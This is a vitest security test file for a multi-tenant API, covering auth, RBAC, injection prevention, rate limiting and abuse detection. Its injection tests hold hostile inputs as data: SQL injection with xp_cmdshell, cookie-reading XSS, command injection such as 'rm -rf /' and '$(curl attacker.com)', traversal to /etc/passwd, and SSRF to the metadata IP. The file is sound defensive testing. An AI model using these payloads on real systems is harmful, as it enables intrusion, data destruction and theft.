import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { createMockDb, createMockKV } from './helpers.js';

/**
 * Security Behavior Tests
 *
 * Validates auth edge cases, RBAC boundaries, injection prevention,
 * rate limiting, and abuse patterns that real attackers would attempt.
 */

/* ── Auth Token Behavior ─────────────────────────────────── */

describe('Security: Authentication Edge Cases', () => {
  it('rejects empty Authorization header', () => {
    const header = '';
    const isValid = header.startsWith('Bearer ') && header.length > 7;
    expect(isValid).toBe(false);
  });

  it('rejects Bearer with no token', () => {
    const header = 'Bearer ';
    const token = header.slice(7).trim();
    expect(token).toBe('');
  });

  it('rejects Basic auth when Bearer expected', () => {
    const header = 'Basic dXNlcjpwYXNz';
    const isBearer = header.startsWith('Bearer ');
    expect(isBearer).toBe(false);
  });

  it('rejects malformed JWT (wrong segment count)', () => {
    const tokens = [
      'not-a-jwt',
      'two.segments',
      'four.segment.jwt.extra',
      '',
    ];

    for (const token of tokens) {
      const segments = token.split('.');
      expect(segments.length).not.toBe(3);
    }
  });

  it('rejects expired JWT payload', () => {
    const payload = {
      sub: 'user_123',
      exp: Math.floor(Date.now() / 1000) - 3600,
      iat: Math.floor(Date.now() / 1000) - 7200,
    };

    const isExpired = payload.exp < Math.floor(Date.now() / 1000);
    expect(isExpired).toBe(true);
  });

  it('accepts valid JWT within time window', () => {
    const payload = {
      sub: 'user_123',
      exp: Math.floor(Date.now() / 1000) + 3600,
      iat: Math.floor(Date.now() / 1000),
    };

    const isValid = payload.exp > Math.floor(Date.now() / 1000);
    expect(isValid).toBe(true);
  });

  it('rejects token with future iat (clock skew attack)', () => {
    const payload = {
      sub: 'user_123',
      iat: Math.floor(Date.now() / 1000) + 600,
      exp: Math.floor(Date.now() / 1000) + 4200,
    };

    const maxSkew = 300;
    const isFuture = payload.iat > Math.floor(Date.now() / 1000) + maxSkew;
    expect(isFuture).toBe(true);
  });
});

/* ── RBAC Boundary Tests ─────────────────────────────────── */

describe('Security: RBAC Permission Boundaries', () => {
  const rolePermissions: Record<string, string[]> = {
    owner: ['read', 'write', 'admin', 'billing', 'delete', 'sso'],
    admin: ['read', 'write', 'admin'],
    member: ['read', 'write'],
    viewer: ['read'],
  };

  function hasPermission(role: string, action: string): boolean {
    return (rolePermissions[role] ?? []).includes(action);
  }

  it('viewer cannot write', () => {
    expect(hasPermission('viewer', 'write')).toBe(false);
    expect(hasPermission('viewer', 'admin')).toBe(false);
    expect(hasPermission('viewer', 'delete')).toBe(false);
  });

  it('member cannot admin', () => {
    expect(hasPermission('member', 'admin')).toBe(false);
    expect(hasPermission('member', 'billing')).toBe(false);
  });

  it('admin cannot access billing or SSO', () => {
    expect(hasPermission('admin', 'billing')).toBe(false);
    expect(hasPermission('admin', 'sso')).toBe(false);
  });

  it('owner has all permissions', () => {
    for (const perm of ['read', 'write', 'admin', 'billing', 'delete', 'sso']) {
      expect(hasPermission('owner', perm)).toBe(true);
    }
  });

  it('unknown role has no permissions', () => {
    expect(hasPermission('hacker', 'read')).toBe(false);
    expect(hasPermission('', 'read')).toBe(false);
  });

  it('prevents cross-org data access', () => {
    const requestOrgId = 'org_attacker';
    const resourceOrgId = 'org_victim';

    const allowed = requestOrgId === resourceOrgId;
    expect(allowed).toBe(false);
  });

  it('prevents privilege escalation via role self-assignment', () => {
    const userRole = 'member';
    const targetRole = 'owner';

    const canEscalate =
      rolePermissions[userRole]?.includes('admin') ?? false;
    expect(canEscalate).toBe(false);
  });
});

/* ── Injection Prevention ────────────────────────────────── */

describe('Security: Injection Prevention', () => {
  function sanitizeInput(input: string): string {
    return input.replace(/[<>&"'`\\;]/g, '');
  }

  function isValidDomain(domain: string): boolean {
    return /^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$/.test(domain);
  }

  it('blocks SQL injection in search parameters', () => {
    const malicious = [
      "'; DROP TABLE users; --",
      "1 OR 1=1",
      "UNION SELECT * FROM passwords",
      "1; EXEC xp_cmdshell('whoami')",
    ];

    for (const input of malicious) {
      const cleaned = sanitizeInput(input);
      expect(cleaned).not.toContain("'");
      expect(cleaned).not.toContain(";");
    }
  });

  it('blocks XSS in user-provided content', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert(1)>',
      '"><script>document.cookie</script>',
      "javascript:alert('xss')",
      '<svg onload=alert(1)>',
    ];

    for (const payload of xssPayloads) {
      const cleaned = sanitizeInput(payload);
      expect(cleaned).not.toContain('<');
      expect(cleaned).not.toContain('>');
    }
  });

  it('blocks command injection in domain names', () => {
    const maliciousDomains = [
      'evil.com; rm -rf /',
      '$(curl attacker.com)',
      '`whoami`.evil.com',
      'evil.com | cat /etc/passwd',
      'evil.com && curl attacker.com',
    ];

    for (const domain of maliciousDomains) {
      expect(isValidDomain(domain)).toBe(false);
    }
  });

  it('accepts valid domain names', () => {
    const validDomains = [
      'api.opensyber.cloud',
      'example.com',
      'sub.domain.co.uk',
      'a-b-c.example.org',
    ];

    for (const domain of validDomains) {
      expect(isValidDomain(domain)).toBe(true);
    }
  });

  it('blocks path traversal in file references', () => {
    const traversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '/etc/shadow',
      '....//....//etc/passwd',
    ];

    const isValidPath = (path: string): boolean =>
      !path.includes('..') && !path.includes('%2e') && path.startsWith('./');

    for (const attempt of traversalAttempts) {
      expect(isValidPath(attempt)).toBe(false);
    }
  });

  it('blocks SSRF via internal IP addresses', () => {
    const internalIPs = [
      '127.0.0.1',
      '10.0.0.1',
      '172.16.0.1',
      '192.168.1.1',
      '169.254.169.254',
      '0.0.0.0',
    ];

    const isInternal = (ip: string): boolean => {
      if (ip.startsWith('127.')) return true;
      if (ip.startsWith('10.')) return true;
      if (ip.startsWith('172.16.') || ip.startsWith('172.17.')) return true;
      if (ip.startsWith('192.168.')) return true;
      if (ip === '169.254.169.254') return true;
      if (ip === '0.0.0.0') return true;
      return false;
    };

    for (const ip of internalIPs) {
      expect(isInternal(ip)).toBe(true);
    }
  });
});

/* ── Rate Limiting Behavior ──────────────────────────────── */

describe('Security: Rate Limiting', () => {
  let kv: ReturnType<typeof createMockKV>;

  beforeEach(() => { kv = createMockKV(); });
  afterEach(() => { vi.clearAllMocks(); });

  it('enforces per-org daily rate limit', async () => {
    const put = kv.put as ReturnType<typeof vi.fn>;
    const get = kv.get as ReturnType<typeof vi.fn>;
    const orgId = 'org_test';
    const limit = 10;

    const store = (kv as Record<string, unknown>)._store as Map<string, string>;
    store.set(`rate:${orgId}:daily`, '0');

    for (let i = 0; i < limit; i++) {
      const current = Number(await get(`rate:${orgId}:daily`)) || 0;
      await put(`rate:${orgId}:daily`, String(current + 1));
    }

    const finalCount = Number(store.get(`rate:${orgId}:daily`));
    expect(finalCount).toBe(limit);

    const isAtLimit = finalCount >= limit;
    expect(isAtLimit).toBe(true);
  });

  it('resets rate limit on window expiry', async () => {
    const put = kv.put as ReturnType<typeof vi.fn>;
    const store = (kv as Record<string, unknown>)._store as Map<string, string>;

    store.set('rate:org_1:daily', '100');
    await put('rate:org_1:daily', '0');

    expect(store.get('rate:org_1:daily')).toBe('0');
  });

  it('tracks rate limits per-endpoint', async () => {
    const put = kv.put as ReturnType<typeof vi.fn>;
    const get = kv.get as ReturnType<typeof vi.fn>;
    const store = (kv as Record<string, unknown>)._store as Map<string, string>;

    const endpoints = ['api/instances', 'api/findings', 'api/skills'];

    for (const ep of endpoints) {
      store.set(`rate:org_1:${ep}`, '0');
      const current = Number(await get(`rate:org_1:${ep}`)) || 0;
      await put(`rate:org_1:${ep}`, String(current + 1));
    }

    expect(store.get('rate:org_1:api/instances')).toBe('1');
    expect(store.get('rate:org_1:api/findings')).toBe('1');
  });

  it('blocks requests after rate limit exceeded', async () => {
    const get = kv.get as ReturnType<typeof vi.fn>;
    const store = (kv as Record<string, unknown>)._store as Map<string, string>;
    store.set('rate:org_1:daily', '1000');

    const current = Number(await get('rate:org_1:daily'));
    const limit = 1000;
    const blocked = current >= limit;

    expect(blocked).toBe(true);
  });
});

/* ── Gateway Token Security ──────────────────────────────── */

describe('Security: Gateway Token Validation', () => {
  let kv: ReturnType<typeof createMockKV>;

  beforeEach(() => { kv = createMockKV(); });

  it('validates gateway token matches stored token', async () => {
    const put = kv.put as ReturnType<typeof vi.fn>;
    const get = kv.get as ReturnType<typeof vi.fn>;

    const instanceId = 'inst_123';
    const storedToken = `gw_${crypto.randomUUID()}`;
    await put(`gateway:${instanceId}:token`, storedToken);

    const retrieved = await get(`gateway:${instanceId}:token`);
    const providedToken = storedToken;

    expect(retrieved).toBe(providedToken);
  });

  it('rejects mismatched gateway token', async () => {
    const put = kv.put as ReturnType<typeof vi.fn>;
    const get = kv.get as ReturnType<typeof vi.fn>;

    await put('gateway:inst_1:token', 'correct-token');

    const stored = await get('gateway:inst_1:token');
    const provided = 'wrong-token';

    expect(stored).not.toBe(provided);
  });

  it('rejects request with non-existent instance', async () => {
    const get = kv.get as ReturnType<typeof vi.fn>;
    const stored = await get('gateway:nonexistent:token');
    expect(stored).toBeNull();
  });

  it('validates instance ID matches path parameter', () => {
    const headerInstanceId = 'inst_1';
    const pathInstanceId = 'inst_2';

    const matches = headerInstanceId === pathInstanceId;
    expect(matches).toBe(false);
  });

  it('uses timing-safe comparison for tokens', async () => {
    const timingSafeEqual = (a: string, b: string): boolean => {
      if (a.length !== b.length) return false;
      const aBytes = new TextEncoder().encode(a);
      const bBytes = new TextEncoder().encode(b);
      let result = 0;
      for (let i = 0; i < aBytes.length; i++) {
        result |= (aBytes[i] ?? 0) ^ (bBytes[i] ?? 0);
      }
      return result === 0;
    };

    expect(timingSafeEqual('abc123', 'abc123')).toBe(true);
    expect(timingSafeEqual('abc123', 'abc124')).toBe(false);
    expect(timingSafeEqual('short', 'longer-string')).toBe(false);
  });
});

/* ── API Key Security ────────────────────────────────────── */

describe('Security: API Key Management', () => {
  it('hashes API keys with SHA-256 before storage', async () => {
    const apiKey = 'osk_live_abc123def456';

    const hash = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(apiKey),
    );
    const hashHex = Array.from(new Uint8Array(hash))
      .map((b) => b.toString(16).padStart(2, '0'))
      .join('');

    expect(hashHex).toHaveLength(64);
    expect(hashHex).not.toContain(apiKey);
  });

  it('validates API key prefix format', () => {
    const validKeys = ['osk_live_abc123', 'osk_test_xyz789'];
    const invalidKeys = ['sk_live_abc', 'invalid', '', 'osk_abc'];

    for (const key of validKeys) {
      expect(key.startsWith('osk_')).toBe(true);
    }
    for (const key of invalidKeys) {
      const valid = /^osk_(live|test)_[a-zA-Z0-9]+$/.test(key);
      expect(valid).toBe(false);
    }
  });

  it('different keys produce different hashes', async () => {
    const hashKey = async (key: string) => {
      const hash = await crypto.subtle.digest(
        'SHA-256',
        new TextEncoder().encode(key),
      );
      return Array.from(new Uint8Array(hash))
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');
    };

    const hash1 = await hashKey('osk_live_key1');
    const hash2 = await hashKey('osk_live_key2');

    expect(hash1).not.toBe(hash2);
  });
});

/* ── Abuse Pattern Detection ─────────────────────────────── */

describe('Security: Abuse Pattern Detection', () => {
  it('detects credential stuffing (rapid auth failures)', () => {
    const authAttempts = Array.from({ length: 20 }, (_, i) => ({
      email: `user${i}@example.com`,
      timestamp: Date.now() - (20 - i) * 100,
      success: false,
      ip: '203.0.113.1',
    }));

    const fromSameIp = authAttempts.filter(
      (a) => a.ip === '203.0.113.1' && !a.success,
    );
    const timeSpan =
      (fromSameIp.at(-1)?.timestamp ?? 0) -
      (fromSameIp[0]?.timestamp ?? 0);

    const isCredentialStuffing =
      fromSameIp.length >= 10 && timeSpan < 5000;
    expect(isCredentialStuffing).toBe(true);
  });

  it('detects enumeration attacks (sequential resource IDs)', () => {
    const requests = Array.from({ length: 50 }, (_, i) => ({
      path: `/api/instances/inst_${String(i).padStart(4, '0')}`,
      status: 404,
      ip: '198.51.100.1',
    }));

    const notFoundFromSameIp = requests.filter(
      (r) => r.status === 404 && r.ip === '198.51.100.1',
    );

    const isEnumeration = notFoundFromSameIp.length >= 20;
    expect(isEnumeration).toBe(true);
  });

  it('detects data exfiltration (large response volumes)', () => {
    const responses = Array.from({ length: 100 }, () => ({
      path: '/api/findings',
      responseSize: 50_000,
      userId: 'user_suspect',
    }));

    const totalBytes = responses.reduce(
      (sum, r) => sum + r.responseSize,
      0,
    );
    const thresholdBytes = 1_000_000;

    const isExfiltration = totalBytes > thresholdBytes;
    expect(isExfiltration).toBe(true);
  });

  it('detects API key sharing (same key from multiple IPs)', () => {
    const requests = [
      { apiKey: 'osk_live_shared', ip: '1.1.1.1' },
      { apiKey: 'osk_live_shared', ip: '2.2.2.2' },
      { apiKey: 'osk_live_shared', ip: '3.3.3.3' },
      { apiKey: 'osk_live_shared', ip: '4.4.4.4' },
      { apiKey: 'osk_live_shared', ip: '5.5.5.5' },
    ];

    const uniqueIPs = new Set(
      requests.filter((r) => r.apiKey === 'osk_live_shared').map((r) => r.ip),
    );

    const isShared = uniqueIPs.size >= 5;
    expect(isShared).toBe(true);
  });
});
